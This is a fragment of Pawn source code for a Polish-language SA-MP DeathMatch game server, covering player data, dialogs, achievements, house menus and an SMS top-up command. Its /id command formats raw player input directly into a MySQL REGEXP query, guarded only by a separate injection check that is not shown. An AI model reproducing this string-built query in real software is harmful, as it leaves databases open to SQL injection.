	r5,
	r6,
	r7,
	A1,
	A2,
	A3,
	A4,
	A5,
	A6,
	A7,
	A8,
	Czat,
	Solo,
	Potwory,
	Zabawyp,
	Wizyty,
	Float: GL,
	Questy,
	bool: Bonus,
 	Bank,
 	BankC,
  	Rud,
  	Email[40],
  	CPick,
  	Gong,
	Auth[17],
	TempAuth[17],
};
new Player[MAX_PLAYERS][E_PLAYERS];

//dialog data
enum
{
	DIALOG_UNUSED,
	DIALOG_LOGIN,
	DIALOG_REGISTER,
	DIALOG_DO,
	DIALOG_RADIO,
	DIALOG_EKWIPUNEK,
	DIALOG_KLANY,
	DIALOG_KLAN,
	DIALOG_KLANO,
	DIALOG_KLANL,
 	DIALOG_KLANLM,
 	DIALOG_KLANLMA,
 	DIALOG_KLANNAME,
   	DIALOG_KLANNAMEEDIT,
 	DIALOG_KLANTAG,
  	DIALOG_KLANTAGEDIT,
	DIALOG_KLANKOLOR,
	DIALOG_KLANKOLOREDIT,
	DIALOG_KLANCONFIRM,
	DIALOG_KLANDELETE,
	DIALOG_KLANWOJNA,
	DIALOG_KLANINVITE,
	DIALOG_KLANINVITEA,
	DIALOG_KLANYW,
	DIALOG_PRIVCAR,
	DIALOG_PRIVCARKOLOR1,
	DIALOG_PRIVCARKOLOR2,
	DIALOG_PRIVCARMODEL,
	DIALOG_PRIVCARNEON,
	DIALOG_PRIVCARFUEL,
	DIALOG_PRIVCARTAKE,
	DIALOG_PRIVCAROFFER,
	DIALOG_PRIVCAROFFER2,
	DIALOG_PRIVCARENGINE,
	DIALOG_HOUSEBUY,
	DIALOG_TELEPORTMENU,
	DIALOG_HOUSEFURNITURE,
	DIALOG_BLANKTELEPORT,
	DIALOG_SKINL,
	DIALOG_SKINS,
	DIALOG_SKINS1,
	DIALOG_SKINS2,
	DIALOG_SKINS3,
	DIALOG_SKINS4,
	DIALOG_SKINS5,
	DIALOG_SKINS6,
	DIALOG_SKINS7,
	DIALOG_SKINS8,
 	DIALOG_PRACA,
	DIALOG_SPEDYCJA,
	DIALOG_T1,
	DIALOG_T2,
	DIALOG_T3,
	DIALOG_T4,
	DIALOG_TRANSPORTCREATE,
	DIALOG_ACCEPTDUEL,
	DIALOG_HELP,
	DIALOG_KOPALNIA,
	DIALOG_SUPPORTSEL,
	DIALOG_SUPPORTSEL2,
	DIALOG_SUPPORTSEND,
	DIALOG_SUPPORTSEND2,
	DIALOG_SUPPORTSELA,
	DIALOG_SUPPORTREPLY,
	DIALOG_SUPPORTREPLYA,
	DIALOG_KONTO,
	DIALOG_PASSCHANGE,
	DIALOG_NICKCHANGE,
	DIALOG_SMS,
	DIALOG_SKLEP,
	DIALOG_BRONIE,
	DIALOG_PLAYER,
	DIALOG_PLAYERP,
	DIALOG_PLAYERIP,
	DIALOG_RESPONSE_PLAYER,
	DIALOG_RESPONSE_PLAYERP,
	DIALOG_RESPONSE_PLAYERIP,
	DIALOG_BOMBA,
	DIALOG_CHEATS,
	DIALOG_LASER,
	DIALOG_TOP,
	DIALOG_INFO,
	DIALOG_BACKHELP,
	DIALOG_KARTA,
	DIALOG_IS,
	DIALOG_CMDHELP,
	DIALOG_BANK,
	DIALOG_BANK1,
	DIALOG_BANK2,
	DIALOG_BANK3,
	DIALOG_BANK4,
	DIALOG_DOM,
	DIALOG_DOM_1,
	DIALOG_DOM_2,
	DIALOG_DOM_3,
	DIALOG_DOM_4,
	DIALOG_DOM_5,
	DIALOG_DOM_11,
	DIALOG_DOM_12,
	DIALOG_DOM_13,
	DIALOG_SELL_HOUSE,
	DIALOG_SELL_HOUSE_XD,
	DIALOG_SELL_HOUSE_ID,
	DIALOG_SELL_HOUSE_KASA,
	DIALOG_SELL_HOUSE_EXP,
	DIALOG_SELL_HOUSE_WYSLIJ_OFERTE,
	DIALOG_HOUSE_KUP_OD_GRACZA,
 	DIALOG_ZMIANA_WNETRZA,
 	DIALOG_KUPNO_WNETRZA,
 	DIALOG_EXTENSION_HOUSE,
 	DIALOG_EXTENSION_HOUSE2,
 	DIALOG_VOTE,
 	DIALOG_CMD1,
 	DIALOG_CMD2,
 	DIALOG_CMD3,
 	DIALOG_CMD4,
 	DIALOG_CMD5,
 	DIALOG_CMD6,
 	DIALOG_CMD7,
 	DIALOG_CMD8,
 	DIALOG_CMD9,
 	DIALOG_CMD10,
	DIALOG_CMD11,
 	DIALOG_ADMIN1,
 	DIALOG_DJ,
 	DIALOG_DJYT,
  	DIALOG_EMAIL,
  	DIALOG_RRULE,
	DIALOG_FIGHT,
	DIALOG_GONG,
	DIALOG_AUTHCODE,
	DIALOG_AUTHCORM,
	DIALOG_AUTHOFF,
};

stock GetPrivcarHandling(playerid)
{
	new is = 0;
	Loop(privcarid, MAX_PRIVCARS)
	{
		if(pOwner[privcarid] == Player[playerid][ID])
		{
			new model = GetVehicleModel(ppVeh[privcarid]);
			switch(model)
			{
	    			case 400, 404, 479: is = 1;
	    			case 401, 529, 546, 566: is = 1;
	    			case 402: is = 1;
	    			case 403: is = 1;
	    			case 405, 542, 547, 589: is = 1;
	    			case 406: is = 1;
	    			case 407, 527, 549, 550, 551, 565, 580: is = 1;
	    			case 408: is = 1;
	   			case 409: is = 1;
	    			case 410: is = 1;
	    			case 412, 526, 558, 561, 562, 587: is = 1;
	    			case 413, 414, 416, 418, 482: is = 1;
	    			case 419, 517: is = 1;
				case 422, 423, 436, 573, 600, 605, 609: is = 1;
				case 437, 552: is = 1;
				case 458, 554: is = 1;
				case 471, 531, 543: is = 1;
				case 475: is = 1;
				case 491: is = 1;
				case 498: is = 1;
				case 506: is = 1;
				case 507, 535, 536: is = 1;
				case 508: is = 1;
				case 516, 540: is = 1;
				case 541: is = 1;
			}
		}
	}
	return is;
}

forward Autorzy(playerid);
public Autorzy(playerid)
{
	new autorstr[1024];
	format(autorstr, sizeof(autorstr), "{FFFF00}"WERSJA" "C_WHITE"jest kontynuacj¹ poprzedniej edycji serwera.\n\n"C_BLUE1"Autorzy: "C_WHITE""AUTOR", "AUTOR2", "AUTOR3"\n"C_BLUE1"Obiekty: "C_WHITE"Mr.A., ZawacuS, KamiLu, FrosteR, Dredd, NeRmo_");
	format(autorstr, sizeof(autorstr), "%s\n\n"C_WHITE"Podziêkowania dla:\n{FFFF00}NeRmo_, Robokop500, Hektorek_TeamRIOT, Bonn333, UFO, DsJ3\n"C_WHITE"Za pomoc w testach skryptu.\n\n"C_BLUE1""GM_VER" "C_WHITE"(Ostatnia aktualizacja: "AKTUALIZACJA")\n\n"COPYRIGHT"", autorstr);
	return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA"", autorstr, "Zamknij", "");
}

forward sInfo(playerid);
public sInfo(playerid)
{
	new tstr[1024];
	format(tstr, sizeof(tstr), ""C_WHITE"Serwer "NAZWA" "C_WHITE"jest serwerem DeathMatch na autorskim skrypcie. Projekt zacz¹³ powstawaæ w marcu 2017 roku. Naszym celem by³o stworzenie serwera DM atrakcyjnego dla graczy.\n");
	format(tstr, sizeof(tstr), "%s"C_WHITE"Poœwiêciliœmy kilkadziesi¹t godzin na to, aby serwer w jakimœ stopniu dobrze wygl¹da³ oraz dobrze dzia³a³. Staramy siê go ci¹gle rozwijaæ.\n", tstr);
	format(tstr, sizeof(tstr), "%s"C_WHITE"Na serwerze znajdziesz pe³no atrakcji, prac oraz innych elementów, które mamy nadziejê, ¿e przyci¹gn¹ Ciê do gry tutaj na jak najd³u¿szy okres czasu.\n\n¯yczymy przyjemnej gry na serwerze.\n\n"COPYRIGHT"", tstr);
	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Informacje ogólne", tstr, "Cofnij", "Zamknij");
}

forward HideAExp(playerid);
public HideAExp(playerid) PlayerTextDrawHide(playerid, ExpPlus[playerid]);

AddExp(playerid, exp) {
	if(TDOn[playerid]) {
	    new exstr[128];
	    format(exstr, sizeof(exstr), "~g~~h~~h~+~w~~h~%d", exp);
		PlayerTextDrawSetString(playerid, ExpPlus[playerid], exstr);
		if(TDOn[playerid]) PlayerTextDrawShow(playerid, ExpPlus[playerid]);
		SetTimerEx("HideAExp", 4000, 0, "i", playerid); }
	return Player[playerid][Exp] += exp; }

GiveClanAchievement(clanid, number)
{
	if(!gAch[clanid][number])
	{
		gAch[clanid][number] = true;
		Loop(playerid, MAX_PLAYERS) {
	    if(IsPlayerConnected(playerid) && Player[playerid][Gang] == clanid) {
	        new gangstrinfo[256];
	        format(gangstrinfo, sizeof(gangstrinfo), "{34ed87}Twój klan zdobywa nowe odznaczenie!");
	        SendClientMessage(playerid, -1, gangstrinfo);
			Sound(playerid,1137,0.0,0.0,0.0); } }
	}
}

new bool:accountfound[MAX_PLAYERS];

#define MAX_SKINS 37
new bool:sk[MAX_PLAYERS][37];

CMD:id(playerid, params[])
{
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/id [fragment nicku]");
    if(SQLInjection(params))
    {
		if(pAch[playerid][1] < 1) {
			pAch[playerid][1] = 1;
			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
		return 1;
    }
 	new sql[1024], uid, name[20];
	m_query("SELECT playerid, username FROM players WHERE username REGEXP '%s' && playerid > -1 ORDER BY playerid ASC", params);
	mysql_store_result();
	new tickety = mysql_num_rows();
	if(tickety == 0) return DialogError(playerid, "{FFFF00}Wyszukiwanie nie zwróci³o ¿adnego wyniku.");
	if(tickety > 9) return DialogError(playerid, "{FFFF00}Wyszukiwanie zwróci³o zbyt du¿o wyników.");
	while(mysql_fetch_row(sql))
	{
		sscanf(sql, "p<|>is[1024]", uid, sql);
		sscanf(sql, "p<|>s[20]", name);
		new ss[256];
		format(ss, sizeof(ss), ""C_WHITE"ID "C_ORANGE"%d"C_WHITE": %s", uid, name);
		SendClientMessage(playerid, -1, ss);
	}
	return mysql_free_result();
}

CheckAch(playerid)
{
	if(Player[playerid][Wizyty] > 0 && pAch[playerid][0] < 1) {
		pAch[playerid][0] = 1;
		AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Powrót", "New achievement: "C_NICK"Powrót"); }
	if(Player[playerid][House] > -1 && pAch[playerid][2] < 1) {
		pAch[playerid][2] = 1;
  		AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Cztery œciany", "New achievement: "C_NICK"Cztery œciany"); }
	if(Player[playerid][Wizyty] >= 100 && pAch[playerid][4] < 1) {
		pAch[playerid][4] = 1;
		AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Sta³y gracz (1)", "New achievement: "C_NICK"Sta³y gracz (1)"); }
	if(Player[playerid][Wizyty] >= 500 && pAch[playerid][4] < 2) {
		pAch[playerid][4] = 2;
  		AddExp(playerid, 400);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Sta³y gracz (2)", "New achievement: "C_NICK"Sta³y gracz (2)"); }
	if(Player[playerid][Wizyty] >= 1000 && pAch[playerid][4] < 3) {
		pAch[playerid][4] = 3;
		AddExp(playerid, 600);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Sta³y gracz (3)", "New achievement: "C_NICK"Sta³y gracz (3)"); }
	if(Player[playerid][Kills] >= 500 && pAch[playerid][5] < 1) {
		pAch[playerid][5] = 1;
        AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Morderca (1)", "New achievement: "C_NICK"Morderca (1)"); }
	if(Player[playerid][Kills] >= 1000 && pAch[playerid][5] < 2) {
		pAch[playerid][5] = 2;
        AddExp(playerid, 400);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Morderca (2)", "New achievement: "C_NICK"Morderca (2)"); }
	if(Player[playerid][Kills] >= 5000 && pAch[playerid][5] < 3) {
		pAch[playerid][5] = 3;
        AddExp(playerid, 600);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Morderca (3)", "New achievement: "C_NICK"Morderca (3)"); }
	if(Player[playerid][Potwory] >= 50 && pAch[playerid][9] < 1) {
		pAch[playerid][9] = 1;
        AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Z³ap je wszystkie! (1)", "New achievement: "C_NICK"Z³ap je wszystkie! (1)"); }
	if(Player[playerid][Potwory] >= 100 && pAch[playerid][9] < 2) {
		pAch[playerid][9] = 2;
        AddExp(playerid, 400);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Z³ap je wszystkie! (2)", "New achievement: "C_NICK"Z³ap je wszystkie! (2)"); }
	if(Player[playerid][Potwory] > 250 && pAch[playerid][9] < 3) {
		pAch[playerid][9] = 3;
        AddExp(playerid, 600);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Z³ap je wszystkie! (3)", "New achievement: "C_NICK"Z³ap je wszystkie! (3)"); }
	if(Player[playerid][Exp] >= 10000 && pAch[playerid][10] < 1) {
		pAch[playerid][10] = 1;
        AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Ekonom (1)", "New achievement: "C_NICK"Ekonom (1)"); }
	if(Player[playerid][Exp] >= 50000 && pAch[playerid][10] < 2) {
		pAch[playerid][10] = 2;
        AddExp(playerid, 400);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Ekonom (2)", "New achievement: "C_NICK"Ekonom (2)"); }
	if(Player[playerid][Exp] >= 100000 && pAch[playerid][10] < 3) {
		pAch[playerid][10] = 3;
		AddExp(playerid, 600);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Ekonom (3)", "New achievement: "C_NICK"Ekonom (3)"); }
	if(Player[playerid][Hours] >= 50 && pAch[playerid][11] < 1) {
		pAch[playerid][11] = 1;
		AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Maniak (1)", "New achievement: "C_NICK"Maniak (1)"); }
	if(Player[playerid][Hours] >= 100 && pAch[playerid][11] < 2) {
		pAch[playerid][11] = 2;
		AddExp(playerid, 400);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Maniak (2)", "New achievement: "C_NICK"Maniak (2)"); }
	if(Player[playerid][Hours] >= 250 && pAch[playerid][11] < 3) {
		pAch[playerid][11] = 3;
		AddExp(playerid, 600);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Maniak (3)", "New achievement: "C_NICK"Maniak (3)"); }
	if(pHours[playerid] >= 2 && pAch[playerid][12] < 1) {
		pAch[playerid][12] = 1;
		AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Nolife (1)", "New achievement: "C_NICK"Nolife (1)"); }
	if(pHours[playerid] >= 5 && pAch[playerid][12] < 2) {
		pAch[playerid][12] = 2;
		AddExp(playerid, 400);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Nolife (2)", "New achievement: "C_NICK"Nolife (2)"); }
	if(pHours[playerid] >= 10 && pAch[playerid][12] < 3) {
		pAch[playerid][12] = 3;
		AddExp(playerid, 600);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Nolife (3)", "New achievement: "C_NICK"Nolife (3)"); }
	if(HavePrivcar[playerid] && pAch[playerid][19] < 1) {
		pAch[playerid][19] = 1;
		AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Kierowca", "New achievement: "C_NICK"Kierowca"); }
}

CMD:osiagniecia(playerid, params[])
{
	new klasydialog[2048];
	if(pAch[playerid][0] > 0) format(klasydialog, sizeof(klasydialog), "{ffa947}Powrót "C_WHITE"({4aff47}Wykonano"C_WHITE")\n");
	else format(klasydialog, sizeof(klasydialog), "{7f572a}???\n");
	if(pAch[playerid][1] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Haker "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][2] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Cztery œciany "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][3] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Cheater "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][4] > 0) {
		if(pAch[playerid][4] == 1) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Sta³y gracz "C_WHITE"({ffa947}1/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][4] == 2) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Sta³y gracz "C_WHITE"({ffa947}2/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][4] == 3) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Sta³y gracz "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog); }
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][5] > 0) {
		if(pAch[playerid][5] == 1) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Morderca "C_WHITE"({ffa947}1/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][5] == 2) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Morderca "C_WHITE"({ffa947}2/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][5] == 3) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Morderca "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog); }
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][6] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Pierwsza krew "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][7] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Terrorysta "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][8] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Kolekcjoner "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][9] > 0) {
		if(pAch[playerid][9] == 1) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Z³ap je wszystkie! "C_WHITE"({ffa947}1/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][9] == 2) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Z³ap je wszystkie! "C_WHITE"({ffa947}2/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][9] == 3) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Z³ap je wszystkie! "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog); }
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][10] > 0) {
		if(pAch[playerid][10] == 1) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Ekonom "C_WHITE"({ffa947}1/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][10] == 2) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Ekonom "C_WHITE"({ffa947}2/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][10] == 3) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Ekonom "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog); }
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][11] > 0) {
		if(pAch[playerid][11] == 1) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Maniak "C_WHITE"({ffa947}1/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][11] == 2) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Maniak "C_WHITE"({ffa947}2/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][11] == 3) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Maniak "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog); }
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][12] > 0) {
		if(pAch[playerid][12] == 1) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Nolife "C_WHITE"({ffa947}1/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][12] == 2) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Nolife "C_WHITE"({ffa947}2/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][12] == 3) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Nolifejjjjj "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog); }
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][13] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Cichy zabójca "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][14] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Pirat drogowy "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][15] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Kopacz "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][16] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Za kratami "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][17] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Poszukiwany "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][18] > 0) {
		if(pAch[playerid][18] == 1) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Imprezowicz "C_WHITE"({ffa947}1/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][18] == 2) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Imprezowicz "C_WHITE"({ffa947}2/3"C_WHITE")\n", klasydialog);
		if(pAch[playerid][18] == 3) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Imprezowicz "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog); }
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][19] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Kierowca "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][20] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Narkoman "C_WHITE"({4aff47}Wykonano"C_WHITE")\n", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???\n", klasydialog);
	if(pAch[playerid][21] > 0) format(klasydialog, sizeof(klasydialog), "%s{ffa947}Wierny do koñca "C_WHITE"({4aff47}Wykonano"C_WHITE")", klasydialog);
	else format(klasydialog, sizeof(klasydialog), "%s{7f572a}???", klasydialog);
	ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_LIST, "{ffa947}Osi¹gniêcia", klasydialog, "Zamknij", "");
	return 1;
}

Sound(playerid, soundid, Float:x, Float:y, Float:z) {
	if(Player[playerid][HasSounds]) PlayerPlaySound(playerid, soundid, x, y, z);
	return 1; }
SendInKopalnia(output[])
{
	Loop(playerid, MAX_PLAYERS) {
		if(IsPlayerInRangeOfPoint(playerid, 120.0,-1382.7828,-2259.3782,37.5516) && IsPlayerConnected(playerid)) SendClientMessage(playerid, -1, output); }
	return 1;
}

CMD:sms(playerid, params[])
{
	new s[1024];
	format(s, 1024, ""C_YELLOW"W tym miejscu mo¿esz do³adowaæ swój portfel kwot¹ "C_WHITE"10 z³"C_YELLOW".\n");
	format(s, 1024, "%s"C_WHITE"\n", s);
	format(s, 1024, "%s"C_YELLOW"Aby do³adowaæ portfel wyœlij SMS o treœci "C_WHITE"AA.SP "C_YELLOW"na numer "C_WHITE"7636"C_YELLOW". "C_WHITE"(7.38 z³)\n", s);
	format(s, 1024, "%s"C_WHITE"\n", s);
	format(s, 1024, "%s"C_YELLOW"Poni¿ej wprowadŸ otrzymany kod zwrotny.\n", s);
    return ShowPlayerDialog(playerid, DIALOG_SMS, DIALOG_STYLE_INPUT, ""NAZWA" {1194D6}» "C_WHITE"Do³adowanie portfela", s, "Do³aduj", "Zamknij");
}

CMD:mail(playerid, params[])
{
  if(strlen(Player[playerid][Email]) > 3) return SendClientMessage(playerid, RED, "Do tego konta jest ju¿ przypisany adres e-mail.");
	new s[1024];
	format(s, 1024, ""C_RED"W tym miejscu mo¿esz dodaæ swój adres email do konta.\n");
	format(s, 1024, "%s"C_RED"Umo¿liwi to ³atwiejsze potwierdzenie Twojej to¿samoœci w razie zapomnienia has³a.\n\n", s);
	format(s, 1024, "%s{FF0000}Pamiêtaj! Zmiana adresu nie jest póŸniej mo¿liwa!\n", s);
	format(s, 1024, "%s{FF0000}Upewnij siê, ¿e wpisany adres jest prawid³owy.", s);
    return ShowPlayerDialog(playerid, DIALOG_EMAIL, DIALOG_STYLE_INPUT, ""NAZWA" {1194D6}» "C_RED"Dodanie konta e-mail", s, "Dodaj", "Zamknij");
}

stock GetZoneName(Float: x, Float: y, Float: z)
{
	new zone[28];
 	for(new i = 0; i < sizeof(SAZones); i++)
 	{
		if(x >= SAZones[i][SAZONE_AREA][0] && x <= SAZones[i][SAZONE_AREA][3] && y >= SAZones[i][SAZONE_AREA][1] && y <= SAZones[i][SAZONE_AREA][4] && z >= SAZones[i][SAZONE_AREA][2] && z <= SAZones[i][SAZONE_AREA][5])
		{
		    strcat(zone, SAZones[i][SAZONE_NAME]);
		    return zone;
		}
	}

	strcat(zone, "Unknown");
	return zone;
}

ObokDomku(playerid)
{
	new cos = -1;
	foreach(new id :Houses)
	{
		if(IsPlayerInRangeOfPoint(playerid, 1.5, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]))
		{
			cos = id;
			break;
		}
	}
	return cos;
}

stock SendToHouse(playerid, id) {
    if(!Iter_Contains(Houses, id)) return 0;
    pData[playerid][InHouse] = id;
    if(OnGame[playerid] != -1) WypiszZabawa(playerid);
    SetPlayerPos(playerid, HouseInteriors[ HouseData[id][Interior] ][intX], HouseInteriors[ HouseData[id][Interior] ][intY], HouseInteriors[ HouseData[id][Interior] ][intZ]);
	SetPlayerInterior(playerid, HouseInteriors[ HouseData[id][Interior] ][intID]);
	SetPlayerVirtualWorld(playerid, id);
	if(HouseData[id][pUID] == Player[playerid][ID]) return SendClientMessage(playerid, -1, ""PYTAJNIK""C_ORANGE"Zarz¹dzaæ domem mo¿esz za pomoc¹ komendy "C_WHITE"/dom"C_YELLOW".");
	return 1; }

stock ShowHouseMenu(playerid) {
	new id = pData[playerid][InHouse];
	if(id < 0) return SendClientMessage(playerid, RED, "Nie jesteœ w ¿adnym domu.");
	if(HouseData[id][pUID] != Player[playerid][ID]) return SendClientMessage(playerid, RED, "Nie jesteœ w³aœcicielem tego domu.");
	new string[400];
	format(string, sizeof(string), ""C_WHITE"Has³o: %s\n"C_RED"Dostêp do domu: %s\n"C_ORANGE"Obiekty domowe\n"C_RED"Wyrzuæ wszystkich z domu\n"C_RED"Sprzedaj dom", HouseData[id][Password], LockNames[ HouseData[id][LockMode] ]);
